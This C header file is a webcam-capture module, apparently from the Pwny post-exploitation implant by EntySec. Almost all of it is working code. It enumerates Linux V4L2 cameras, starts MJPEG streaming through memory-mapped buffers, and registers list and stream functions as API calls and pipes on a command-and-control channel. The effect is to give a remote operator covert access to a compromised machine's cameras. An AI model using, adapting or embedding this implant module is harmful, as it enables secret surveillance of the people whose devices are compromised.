/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _CAM_H_
#define _CAM_H_

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#include <fcntl.h>
#include <linux/videodev2.h>

#define CAM_BASE 5

#define CAM_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CAM_BASE, \
                       API_CALL)

#define CAM_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        CAM_BASE, \
                        PIPE_TYPE)

#define BZERO(x) memset(&(x), 0, sizeof(x))

typedef struct
{
    struct
    {
        void *start;
        size_t length;
    } *buffers;

    unsigned int n_buffers;
    int fd;
} cam_t;

static int xioctl(int fd, int request, void *arg)
{
    int status;

    do
    {
        status = ioctl(fd, request, arg);
    }
    while (status == -1 && errno == EINTR);

    return status;
}

static int cam_device_open(int id)
{
    int fd;
    struct stat st;
    char dev_name[64];

    snprintf(dev_name, sizeof(dev_name), "/dev/video%d", id);
    if (stat(dev_name, &st) == -1)
    {
        return -1;
    }

    if (!S_ISCHR(st.st_mode))
    {
        return -1;
    }

    fd = open(dev_name, O_RDWR | O_NONBLOCK, 0);
    if (fd == -1)
    {
        return -1;
    }

    return fd;
}

static int cam_device_start(cam_t *cam)
{
    int iter;
    enum v4l2_buf_type type;

    struct v4l2_format fmt;
    struct v4l2_requestbuffers req;
    struct v4l2_buffer buf;

    BZERO(fmt);
    BZERO(req);

    fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_MJPEG;
    fmt.fmt.pix.field = V4L2_FIELD_INTERLACED;

    if (xioctl(cam->fd, VIDIOC_S_FMT, &fmt) == -1)
    {
        return -1;
    }

    req.count = 4;
    req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    req.memory = V4L2_MEMORY_MMAP;

    if (xioctl(cam->fd, VIDIOC_REQBUFS, &req) == -1)
    {
        return -1;
    }

    if (req.count < 1)
    {
        return -1;
    }

    cam->buffers = calloc(req.count, sizeof(*cam->buffers));
    if (cam->buffers == NULL)
    {
        return -1;
    }

    for (cam->n_buffers = 0; cam->n_buffers < req.count; cam->n_buffers++)
    {
        BZERO(buf);

        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;
        buf.index = cam->n_buffers;

        if (xioctl(cam->fd, VIDIOC_QUERYBUF, &buf) == -1)
        {
            return -1;
        }

        cam->buffers[cam->n_buffers].length = buf.length;
        cam->buffers[cam->n_buffers].start = mmap(NULL,
            buf.length,
            PROT_READ | PROT_WRITE,
            MAP_SHARED,
            cam->fd, buf.m.offset);

        if (cam->buffers[cam->n_buffers].start == MAP_FAILED)
        {
            return -1;
        }
    }

    for (iter = 0; iter < cam->n_buffers; iter++)
    {
        BZERO(buf);

        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;
        buf.index = iter;

        if (xioctl(cam->fd, VIDIOC_QBUF, &buf) == -1)
        {
            return -1;
        }
    }

    type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    if (xioctl(cam->fd, VIDIOC_STREAMON, &type) == -1)
    {
        return -1;
    }

    return 0;
}

static int cam_readall(pipe_t *pipe, void **buffer)
{
    fd_set fds;
    cam_t *cam;

    struct timeval tv;
    struct v4l2_buffer buf;

    int status;

    cam = pipe->data;
    FD_ZERO(&fds);
    FD_SET(cam->fd, &fds);

    tv.tv_sec = 1;
    tv.tv_usec = 0;

    status = select(cam->fd + 1, &fds, NULL, NULL, &tv);
    if (status == -1)
    {
        return -1;
    }

    BZERO(buf);
    buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    buf.memory = V4L2_MEMORY_MMAP;

    if (xioctl(cam->fd, VIDIOC_DQBUF, &buf) == -1 ||
        buf.index >= cam->n_buffers)
    {
        return -1;
    }

    *buffer = calloc(1, buf.length);
    if (*buffer == NULL)
    {
        return -1;
    }

    memcpy(*buffer, cam->buffers[buf.index].start, buf.length);

    if (xioctl(cam->fd, VIDIOC_QBUF, &buf) == -1)
    {
        free(*buffer);
        return -1;
    }

    return buf.length;
}

static int cam_create(pipe_t *pipe, c2_t *c2)
{
    int device;
    cam_t *cam;

    device = 0;
    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &device);
    cam = calloc(1, sizeof(*cam));

    if (cam == NULL)
    {
        return -1;
    }

    if ((cam->fd = cam_device_open(device)) == -1)
    {
        goto fail;
    }

    if (cam_device_start(cam) == -1)
    {
        goto fail;
    }

    pipe->data = cam;
    return 0;

fail:
    free(cam);
    return -1;
}

static int cam_destroy(pipe_t *pipe, c2_t *c2)
{
    int iter;
    enum v4l2_buf_type type;
    cam_t *cam;

    cam = pipe->data;

    type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    if (xioctl(cam->fd, VIDIOC_STREAMOFF, &type) == -1)
    {
        return -1;
    }

    for (iter = 0; iter < cam->n_buffers; iter++)
    {
        if (munmap(cam->buffers[iter].start, cam->buffers[iter].length) == -1)
        {
            continue;
        }
    }

    free(cam->buffers);
    close(cam->fd);
    free(cam);

    return 0;
}

static tlv_pkt_t *cam_list(c2_t *c2)
{
    int fd;
    int iter;

    struct v4l2_capability cap;
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (iter = 0; iter < 10; iter++)
    {
        if ((fd = cam_device_open(iter)) == -1)
        {
            continue;
        }

        if (xioctl(fd, VIDIOC_QUERYCAP, &cap) == -1)
        {
            if (errno == EINVAL)
            {
                break;
            }

            continue;
        }

        if (!(cap.capabilities & V4L2_CAP_VIDEO_CAPTURE))
        {
            continue;
        }

        if (!(cap.capabilities & V4L2_CAP_STREAMING))
        {
            continue;
        }

        tlv_pkt_add_string(result, TLV_TYPE_STRING, (char *)cap.card);
    }

    return result;
}

void register_cam_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, CAM_LIST, cam_list);
}

void register_cam_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t callbacks;

    callbacks.create_cb = cam_create;
    callbacks.readall_cb = cam_readall;
    callbacks.destroy_cb = cam_destroy;

    api_pipe_register(pipes, CAM_PIPE, callbacks);
}

#endif
